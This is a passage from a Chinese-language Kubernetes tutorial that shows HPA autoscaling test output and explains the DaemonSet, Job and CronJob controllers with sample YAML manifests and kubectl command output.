  0%/3%     1         10        1          62s</span><br></pre></td></tr></table></figure><p><strong>4 测试</strong></p><p>使用压测工具对service地址<code>192.168.5.4:31830</code>进行压测，然后通过控制台查看hpa和pod的变化</p><p>hpa变化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl get hpa -n dev -w</span><br><span class="line">NAME   REFERENCE      TARGETS  MINPODS  MAXPODS  REPLICAS  AGE</span><br><span class="line">pc-hpa  Deployment/nginx  0%/3%   1     10     1      4m11s</span><br><span class="line">pc-hpa  Deployment/nginx  0%/3%   1     10     1      5m19s</span><br><span class="line">pc-hpa  Deployment/nginx  22%/3%   1     10     1      6m50s</span><br><span class="line">pc-hpa  Deployment/nginx  22%/3%   1     10     4      7m5s</span><br><span class="line">pc-hpa  Deployment/nginx  22%/3%   1     10     8      7m21s</span><br><span class="line">pc-hpa  Deployment/nginx  6%/3%   1     10     8      7m51s</span><br><span class="line">pc-hpa  Deployment/nginx  0%/3%   1     10     8      9m6s</span><br><span class="line">pc-hpa  Deployment/nginx  0%/3%   1     10     8      13m</span><br><span class="line">pc-hpa  Deployment/nginx  0%/3%   1     10     1      14m</span><br></pre></td></tr></table></figure><p>deployment变化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl get deployment -n dev -w</span><br><span class="line">NAME    READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">nginx   1/1     1            1           11m</span><br><span class="line">nginx   1/4     1            1           13m</span><br><span class="line">nginx   1/4     1            1           13m</span><br><span class="line">nginx   1/4     1            1           13m</span><br><span class="line">nginx   1/4     4            1           13m</span><br><span class="line">nginx   1/8     4            1           14m</span><br><span class="line">nginx   1/8     4            1           14m</span><br><span class="line">nginx   1/8     4            1           14m</span><br><span class="line">nginx   1/8     8            1           14m</span><br><span class="line">nginx   2/8     8            2           14m</span><br><span class="line">nginx   3/8     8            3           14m</span><br><span class="line">nginx   4/8     8            4           14m</span><br><span class="line">nginx   5/8     8            5           14m</span><br><span class="line">nginx   6/8     8            6           14m</span><br><span class="line">nginx   7/8     8            7           14m</span><br><span class="line">nginx   8/8     8            8           15m</span><br><span class="line">nginx   8/1     8            8           20m</span><br><span class="line">nginx   8/1     8            8           20m</span><br><span class="line">nginx   1/1     1            1           20m</span><br></pre></td></tr></table></figure><p>pod变化</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -w</span><br><span class="line">NAME                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-bh8dr   1/1     Running   0          11m</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-cpgrv   0/1     Pending   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc<span class="string">-8</span>zhwk   0/1     Pending   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-rr9bn   0/1     Pending   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-cpgrv   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc<span class="string">-8</span>zhwk   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-rr9bn   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-m9gsj   0/1     Pending             0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-g56qb   0/1     Pending             0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-sl9c6   0/1     Pending             0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-fgst7   0/1     Pending             0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-g56qb   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-m9gsj   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-sl9c6   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-fgst7   0/1     ContainerCreating   0          0s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc<span class="string">-8</span>zhwk   1/1     Running             0          19s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-rr9bn   1/1     Running             0          30s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-m9gsj   1/1     Running             0          21s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-cpgrv   1/1     Running             0          47s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-sl9c6   1/1     Running             0          33s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-g56qb   1/1     Running             0          48s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-fgst7   1/1     Running             0          66s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-fgst7   1/1     Terminating         0          6m50s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc<span class="string">-8</span>zhwk   1/1     Terminating         0          7m5s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-cpgrv   1/1     Terminating         0          7m5s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-g56qb   1/1     Terminating         0          6m50s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-rr9bn   1/1     Terminating         0          7m5s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-m9gsj   1/1     Terminating         0          6m50s</span><br><span class="line">nginx<span class="string">-7</span>df9756ccc-sl9c6   1/1     Terminating         0          6m50s</span><br></pre></td></tr></table></figure><h2 id="6-5-DaemonSet-DS"><a href="#6-5-DaemonSet-DS" class="headerlink" title="6.5 DaemonSet(DS)"></a>6.5 DaemonSet(DS)</h2><p>DaemonSet类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个Pod提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类Pod就适合使用DaemonSet类型的控制器创建。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200612010223537.png" alt="img"></p><p>DaemonSet控制器的特点：</p><ul><li>每当向集群中添加一个节点时，指定的 Pod 副本也将添加到该节点上</li><li>当节点从集群中移除时，Pod 也就被垃圾回收了</li></ul><p>下面先来看下DaemonSet的资源清单文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span> <span class="comment"># 版本号</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span> <span class="comment"># 类型       </span></span><br><span class="line"><span class="attr">metadata:</span> <span class="comment"># 元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="comment"># rs名称 </span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="comment"># 所属命名空间 </span></span><br><span class="line">  <span class="attr">labels:</span> <span class="comment">#标签</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">daemonset</span></span><br><span class="line"><span class="attr">spec:</span> <span class="comment"># 详情描述</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">3</span> <span class="comment"># 保留历史版本</span></span><br><span class="line">  <span class="attr">updateStrategy:</span> <span class="comment"># 更新策略</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">RollingUpdate</span> <span class="comment"># 滚动更新策略</span></span><br><span class="line">    <span class="attr">rollingUpdate:</span> <span class="comment"># 滚动更新</span></span><br><span class="line">      <span class="attr">maxUnavailable:</span> <span class="number">1</span> <span class="comment"># 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 选择器，通过它指定该控制器管理哪些pod</span></span><br><span class="line">    <span class="attr">matchLabels:</span>      <span class="comment"># Labels匹配规则</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">matchExpressions:</span> <span class="comment"># Expressions匹配规则</span></span><br><span class="line">      <span class="bullet">-</span> &#123;<span class="attr">key:</span> <span class="string">app</span>, <span class="attr">operator:</span> <span class="string">In</span>, <span class="attr">values:</span> [<span class="string">nginx-pod</span>]&#125;</span><br><span class="line">  <span class="attr">template:</span> <span class="comment"># 模板，当副本数量不足时，会根据下面的模板创建pod副本</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>创建pc-daemonset.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span>      </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-daemonset</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span> </span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建daemonset</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml</span><br><span class="line">daemonset.apps/pc-daemonset created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看daemonset</span></span><br><span class="line">[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide</span><br><span class="line">NAME        DESIRED  CURRENT  READY  UP-TO-DATE  AVAILABLE   AGE   CONTAINERS   IMAGES         </span><br><span class="line">pc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod,发现在每个Node上都运行一个pod</span></span><br><span class="line">[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide</span><br><span class="line">NAME                 READY   STATUS    RESTARTS   AGE   IP            NODE    </span><br><span class="line">pc-daemonset-9bck8   1/1     Running   0          37s   10.244.1.43   node1     </span><br><span class="line">pc-daemonset-k224w   1/1     Running   0          37s   10.244.2.74   node2      </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除daemonset</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml</span><br><span class="line">daemonset.apps &quot;pc-daemonset&quot; deleted</span><br></pre></td></tr></table></figure><h2 id="6-6-Job"><a href="#6-6-Job" class="headerlink" title="6.6 Job"></a>6.6 Job</h2><p>Job，主要用于负责**批量处理(一次要处理指定数量任务)<strong>短暂的</strong>一次性(每个任务仅运行一次就结束)**任务。Job特点如下：</p><ul><li>当Job创建的pod执行成功结束时，Job将记录成功结束的pod数量</li><li>当成功结束的pod达到指定的数量时，Job将完成执行</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200618213054113.png" alt="img"></p><p>Job的资源清单文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span> <span class="comment"># 版本号</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Job</span> <span class="comment"># 类型       </span></span><br><span class="line"><span class="attr">metadata:</span> <span class="comment"># 元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="comment"># rs名称 </span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="comment"># 所属命名空间 </span></span><br><span class="line">  <span class="attr">labels:</span> <span class="comment">#标签</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">job</span></span><br><span class="line"><span class="attr">spec:</span> <span class="comment"># 详情描述</span></span><br><span class="line">  <span class="attr">completions:</span> <span class="number">1</span> <span class="comment"># 指定job需要成功运行Pods的次数。默认值: 1</span></span><br><span class="line">  <span class="attr">parallelism:</span> <span class="number">1</span> <span class="comment"># 指定job在任一时刻应该并发运行Pods的数量。默认值: 1</span></span><br><span class="line">  <span class="attr">activeDeadlineSeconds:</span> <span class="number">30</span> <span class="comment"># 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。</span></span><br><span class="line">  <span class="attr">backoffLimit:</span> <span class="number">6</span> <span class="comment"># 指定job失败后进行重试的次数。默认是6</span></span><br><span class="line">  <span class="attr">manualSelector:</span> <span class="literal">true</span> <span class="comment"># 是否可以使用selector选择器选择pod，默认是false</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 选择器，通过它指定该控制器管理哪些pod</span></span><br><span class="line">    <span class="attr">matchLabels:</span>      <span class="comment"># Labels匹配规则</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">counter-pod</span></span><br><span class="line">    <span class="attr">matchExpressions:</span> <span class="comment"># Expressions匹配规则</span></span><br><span class="line">      <span class="bullet">-</span> &#123;<span class="attr">key:</span> <span class="string">app</span>, <span class="attr">operator:</span> <span class="string">In</span>, <span class="attr">values:</span> [<span class="string">counter-pod</span>]&#125;</span><br><span class="line">  <span class="attr">template:</span> <span class="comment"># 模板，当副本数量不足时，会根据下面的模板创建pod副本</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">counter-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Never</span> <span class="comment"># 重启策略只能设置为Never或者OnFailure</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">counter</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关于重启策略设置的说明：</span><br><span class="line">    如果指定为OnFailure，则<span class="keyword">job</span>会在pod出现故障时重启容器，而不是创建pod，failed次数不变</span><br><span class="line">    如果指定为Never，则<span class="keyword">job</span>会在pod出现故障时创建新的pod，并且故障pod不会消失，也不会重启，failed次数加<span class="number">1</span></span><br><span class="line">    如果指定为Always的话，就意味着一直重启，意味着<span class="keyword">job</span>任务会重复去执行了，当然不对，所以不能设置为Always</span><br></pre></td></tr></table></figure><p>创建pc-job.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Job</span>      </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-job</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">manualSelector:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">counter-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">counter-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Never</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">counter</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建job</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pc-job.yaml</span><br><span class="line">job.batch/pc-job created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看job</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w</span><br><span class="line">NAME     COMPLETIONS   DURATION   AGE   CONTAINERS   IMAGES         SELECTOR</span><br><span class="line">pc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod</span><br><span class="line">pc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过观察pod状态可以看到，pod在运行完毕任务后，就会变成Completed状态</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -w</span><br><span class="line">NAME           READY   STATUS     RESTARTS      AGE</span><br><span class="line">pc-job-rxg96   1/1     Running     0            29s</span><br><span class="line">pc-job-rxg96   0/1     Completed   0            33s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来，调整下pod运行的总数量和并行数量 即：在spec下设置下面两个选项</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> completions: 6 <span class="comment"># 指定job需要成功运行Pods的次数为6</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> parallelism: 3 <span class="comment"># 指定job并发运行Pods的数量为3</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 然后重新运行job，观察效果，此时会发现，job会每次运行3个pod，总共执行了6个pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -w</span><br><span class="line">NAME           READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-job-684ft   1/1     Running   0          5s</span><br><span class="line">pc-job-jhj49   1/1     Running   0          5s</span><br><span class="line">pc-job-pfcvh   1/1     Running   0          5s</span><br><span class="line">pc-job-684ft   0/1     Completed   0          11s</span><br><span class="line">pc-job-v7rhr   0/1     Pending     0          0s</span><br><span class="line">pc-job-v7rhr   0/1     Pending     0          0s</span><br><span class="line">pc-job-v7rhr   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-job-jhj49   0/1     Completed           0          11s</span><br><span class="line">pc-job-fhwf7   0/1     Pending             0          0s</span><br><span class="line">pc-job-fhwf7   0/1     Pending             0          0s</span><br><span class="line">pc-job-pfcvh   0/1     Completed           0          11s</span><br><span class="line">pc-job-5vg2j   0/1     Pending             0          0s</span><br><span class="line">pc-job-fhwf7   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-job-5vg2j   0/1     Pending             0          0s</span><br><span class="line">pc-job-5vg2j   0/1     ContainerCreating   0          0s</span><br><span class="line">pc-job-fhwf7   1/1     Running             0          2s</span><br><span class="line">pc-job-v7rhr   1/1     Running             0          2s</span><br><span class="line">pc-job-5vg2j   1/1     Running             0          3s</span><br><span class="line">pc-job-fhwf7   0/1     Completed           0          12s</span><br><span class="line">pc-job-v7rhr   0/1     Completed           0          12s</span><br><span class="line">pc-job-5vg2j   0/1     Completed           0          12s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除job</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml</span><br><span class="line">job.batch &quot;pc-job&quot; deleted</span><br></pre></td></tr></table></figure><h2 id="6-7-CronJob-CJ"><a href="#6-7-CronJob-CJ" class="headerlink" title="6.7 CronJob(CJ)"></a>6.7 CronJob(CJ)</h2><p>CronJob控制器以Job控制器资源为其管控对象，并借助它管理pod资源对象，Job控制器定义的作业任务在其控制器资源创建之后便会立即执行，但CronJob可以以类似于Linux操作系统的周期性任务作业计划的方式控制其运行<strong>时间点</strong>及<strong>重复运行</strong>的方式。也就是说，<strong>CronJob可以在特定的时间点(反复的)去运行job任务</strong>。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200618213149531.png" alt="img"></p><p>CronJob的资源清单文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1beta1</span> <span class="comment"># 版本号</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CronJob</span> <span class="comment"># 类型       </span></span><br><span class="line"><span class="attr">metadata:</span> <span class="comment"># 元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="comment"># rs名称 </span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="comment"># 所属命名空间 </span></span><br><span class="line">  <span class="attr">labels:</span> <span class="comment">#标签</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">cronjob</span></span><br><span class="line"><span class="attr">spec:</span> <span class="comment"># 详情描述</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="comment"># cron格式的作业调度运行时间点,用于控制任务在什么时间执行</span></span><br><span class="line">  <span class="attr">concurrencyPolicy:</span> <span class="comment"># 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业</span></span><br><span class="line">  <span class="attr">failedJobHistoryLimit:</span> <span class="comment"># 为失败的任务执行保留的历史记录数，默认为1</span></span><br><span class="line">  <span class="attr">successfulJobHistoryLimit:</span> <span class="comment"># 为成功的任务执行保留的历史记录数，默认为3</span></span><br><span class="line">  <span class="attr">startingDeadlineSeconds:</span> <span class="comment"># 启动作业错误的超时时长</span></span><br><span class="line">  <span class="attr">jobTemplate:</span> <span class="comment"># job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">completions:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">parallelism:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">activeDeadlineSeconds:</span> <span class="number">30</span></span><br><span class="line">      <span class="attr">backoffLimit:</span> <span class="number">6</span></span><br><span class="line">      <span class="attr">manualSelector:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">selector:</span></span><br><span class="line">        <span class="attr">matchLabels:</span></span><br><span class="line">          <span class="attr">app:</span> <span class="string">counter-pod</span></span><br><span class="line">        <span class="attr">matchExpressions:</span> <span class="string">规则</span></span><br><span class="line">          <span class="bullet">-</span> &#123;<span class="attr">key:</span> <span class="string">app</span>, <span class="attr">operator:</span> <span class="string">In</span>, <span class="attr">values:</span> [<span 